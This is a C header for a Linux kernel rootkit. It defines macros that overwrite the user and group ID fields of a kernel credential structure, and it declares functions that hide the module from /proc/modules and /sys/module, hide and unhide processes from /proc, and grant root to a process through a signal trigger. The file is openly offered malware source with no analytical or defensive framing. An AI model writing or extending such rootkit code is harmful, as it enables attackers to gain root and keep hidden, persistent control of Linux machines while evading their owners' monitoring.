#ifndef _ROOTKIT_UTILS_H_
#define _ROOTKIT_UTILS_H_

#include <linux/types.h>

/**
 * Sets the value of a `kuid_t` variable.
 *
 * @param _kuid The `kuid_t` variable to change
 * @param _uid  The new value to set
 */
#define __SET_UID(_kuid, _uid) \
    do {                       \
        (_kuid).val = (_uid);  \
    } while (0)

/**
 * Sets the value of a `kgid_t` variable.
 *
 * @param _kgid The `kgid_t` variable to change
 * @param _gid  The new value to set
 */
#define __SET_GID(_kgid, _gid) \
    do {                       \
        (_kgid).val = (_gid);  \
    } while (0)

/**
 * Sets the value of the uid, suid, euid and fsuid fields of a `struct cred *` variable.
 *
 * @param _p_creds The `struct cred *` variable to change
 * @param _uid     The new value to set
 */
#define __SET_UIDS(_p_creds, _uid)            \
    do {                                      \
        __SET_UID((_p_creds)->uid, (_uid));   \
        __SET_UID((_p_creds)->suid, (_uid));  \
        __SET_UID((_p_creds)->euid, (_uid));  \
        __SET_UID((_p_creds)->fsuid, (_uid)); \
    } while (0)

/**
 * Sets the value of the gid, sgid, egid and fsgid fields of a `struct cred *` variable.
 *
 * @param _p_creds The `struct cred *` variable to change
 * @param _gid     The new value to set
 */
#define __SET_GIDS(_p_creds, _gid)            \
    do {                                      \
        __SET_GID((_p_creds)->gid, (_gid));   \
        __SET_GID((_p_creds)->sgid, (_gid));  \
        __SET_GID((_p_creds)->egid, (_gid));  \
        __SET_GID((_p_creds)->fsgid, (_gid)); \
    } while (0)

/**
 * Structure used to store the list of hidden PIDs
 */
typedef struct hidden_pid_tag {
    struct list_head list; // PID linked list
    pid_t i32_pid;         // PID to hide
} hidden_pid_t;

extern struct list_head hidden_pids_list; // Head of the hidden PIDs linked list

/**
 * Hides the rootkit from /proc/modules and /sys/module/
 */
void hide_module(void);

/**
 * Clear the list of hidden PIDs and free the memory
 */
void show_all_processes(void);

/**
 * Checks if the given PID is hidden.
 * If the given PID is 0, the current process is checked.
 *
 * @param i32_pid The PID to check
 * @return `true` if the given PID is hidden, `false` otherwise
 */
bool is_process_hidden(const pid_t i32_pid);

/**
 * Elevates the current process to root
 *
 * @param i32_pid The PID that was passed to the rootkit (should be equal to SIGROOT)
 * @param i32_sig The signal that was passed (currently unused)
 * @return 0 on success, otherwise an error code
 */
long give_root(const pid_t i32_pid, const int i32_sig);

/**
 * Hides the given process from /proc/ and /proc/PID/.
 * If the given PID is 0, the current process is hidden.
 *
 * @param i32_pid The PID to hide
 * @param i32_sig The signal that was passed (currently unused)
 * @return 0 on success, otherwise an error code
 */
long hide_process(const pid_t i32_pid, const int i32_sig);

/**
 * Shows (unhides) the given process from /proc/ and /proc/PID/.
 * If the given PID is 0, the current process is shown.
 * If the given PID is not hidden, do nothing.
 *
 * @param i32_pid The PID to show
 * @param i32_sig The signal that was passed (currently unused)
 * @return 0 on success, otherwise an error code
 */
long show_process(const pid_t i32_pid, const int i32_sig);

#endif
